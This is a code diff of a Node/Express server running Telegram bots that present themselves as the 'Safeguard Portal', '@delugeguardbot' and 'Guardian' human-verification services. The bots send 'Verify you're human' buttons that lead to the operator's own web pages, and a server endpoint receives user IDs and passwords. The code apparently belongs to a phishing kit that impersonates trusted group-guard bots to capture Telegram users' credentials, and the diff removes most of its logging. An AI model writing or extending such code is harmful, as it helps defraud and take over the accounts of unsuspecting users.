@@ -78,23 +78,7 @@ const app = express();
 app.use(express.json());
 app.use(express.static("public"));
 
-// Add logging middleware
-app.use((req, res, next) => {
-  console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
-  next();
-});
-
-// Add a specific route for safeguard to debug
-app.get("/safeguard", (req, res) => {
-  console.log("Received request to /safeguard, redirecting to /safeguard/");
-  res.redirect("/safeguard/");
-});
-
 app.post("/api/users/telegram/info", async (req, res) => {
-  console.log(
-    "Received API request with body:",
-    JSON.stringify(req.body, null, 2)
-  );
   try {
     const {
       userId,
@@ -106,8 +90,6 @@ app.post("/api/users/telegram/info", async (req, res) => {
       quicklySet,
       type,
     } = req.body;
-
-    console.log(`Processing verification for user ${userId}, type: ${type}`);
 
     let pass = password;
     if (pass === null) {
@@ -347,105 +329,74 @@ function handleStart(bot) {
   try {
     bot.onText(/\/start/, (msg, match) => {
       let botInfo;
-      console.log(
-        `Received /start command from user ${msg.from.id} (${
-          msg.from.username || "no username"
-        })`
-      );
-
-      bot
-        .getMe()
-        .then((botInformation) => {
-          botInfo = botInformation;
-          console.log(`Bot info retrieved: ${botInfo.username}`);
-
-          if (botInfo.username) {
-            const chatId = msg.chat.id;
-            let jsonToSend;
-            let imageToSend;
-            let verificationUrl = "";
-
-            if (botInfo.username === safeguardUsername) {
-              verificationUrl = `${process.env.DOMAIN}/safeguard/?type=safeguard`;
-              console.log(`Safeguard verification URL: ${verificationUrl}`);
-
-              jsonToSend = {
-                caption: `<b>Verify you're human with Safeguard Portal</b>\n\nClick 'VERIFY' and complete captcha to gain entry`,
-                parse_mode: "HTML",
-                reply_markup: {
-                  inline_keyboard: [
-                    [
-                      {
-                        text: "VERIFY",
-                        web_app: {
-                          url: verificationUrl,
-                        },
+      bot.getMe().then((botInformation) => {
+        botInfo = botInformation;
+        if (botInfo.username) {
+          const chatId = msg.chat.id;
+          let jsonToSend;
+          let imageToSend;
+          if (botInfo.username === safeguardUsername) {
+            jsonToSend = {
+              caption: `<b>Verify you're human with Safeguard Portal</b>\n\nClick 'VERIFY' and complete captcha to gain entry`,
+              parse_mode: "HTML",
+              reply_markup: {
+                inline_keyboard: [
+                  [
+                    {
+                      text: "VERIFY",
+                      web_app: {
+                        url: `${process.env.DOMAIN}/safeguard/?type=safeguard`,
                       },
-                    ],
+                    },
                   ],
-                },
-              };
-              imageToSend = safeguardVerification;
-            } else if (botInfo.username === delugeUsername) {
-              jsonToSend = {
-                caption: `The group is protected by @delugeguardbot.\n\nClick below to start human verification.`,
-                parse_mode: "HTML",
-                reply_markup: {
-                  inline_keyboard: [
-                    [
-                      {
-                        text: "Tap To Verify",
-                        web_app: {
-                          url: `${process.env.DOMAIN}/deluge/?type=deluge`,
-                        },
+                ],
+              },
+            };
+            imageToSend = safeguardVerification;
+          } else if (botInfo.username === delugeUsername) {
+            jsonToSend = {
+              caption: `The group is protected by @delugeguardbot.\n\nClick below to start human verification.`,
+              parse_mode: "HTML",
+              reply_markup: {
+                inline_keyboard: [
+                  [
+                    {
+                      text: "Tap To Verify",
+                      web_app: {
+                        url: `${process.env.DOMAIN}/deluge/?type=deluge`,
                       },
-                    ],
+                    },
                   ],
-                },
-              };
-              imageToSend = delugeVerification;
-            } else if (botInfo.username === guardianUsername) {
-              jsonToSend = {
-                caption: `🧑 <b>Human Authentication</b>\n\nPlease click the button below to verify that you are human.`,
-                parse_mode: "HTML",
-                reply_markup: {
-                  inline_keyboard: [
-                    [
-                      {
-                        text: "Verify",
-                        web_app: {
-                          url: `${process.env.DOMAIN}/guardian/?type=guardian`,
-                        },
+                ],
+              },
+            };
+            imageToSend = delugeVerification;
+          } else if (botInfo.username === guardianUsername) {
+            jsonToSend = {
+              caption: `🧑 <b>Human Authentication</b>\n\nPlease click the button below to verify that you are human.`,
+              parse_mode: "HTML",
+              reply_markup: {
+                inline_keyboard: [
+                  [
+                    {
+                      text: "Verify",
+                      web_app: {
+                        url: `${process.env.DOMAIN}/guardian/?type=guardian`,
                       },
-                    ],
+                    },
                   ],
-                },
-              };
-              imageToSend = guardianVerification;
-            }
-
-            console.log(`Sending verification message to chat ${chatId}`);
-            bot
-              .sendPhoto(chatId, imageToSend, jsonToSend)
-              .then(() =>
-                console.log(
-                  `Verification message sent successfully to chat ${chatId}`
-                )
-              )
-              .catch((err) =>
-                console.error(
-                  `Error sending verification message: ${err.message}`
-                )
-              );
+                ],
+              },
+            };
+            imageToSend = guardianVerification;
           }
-        })
-        .catch((err) =>
-          console.error(`Error getting bot info: ${err.message}`)
-        );
+
+          bot.sendPhoto(chatId, imageToSend, jsonToSend);
+        }
+      });
     });
   } catch (error) {
-    console.error(`Error in handleStart: ${error.message}`);
-    console.error(error.stack);
+    console.log(error);
   }
 }
 
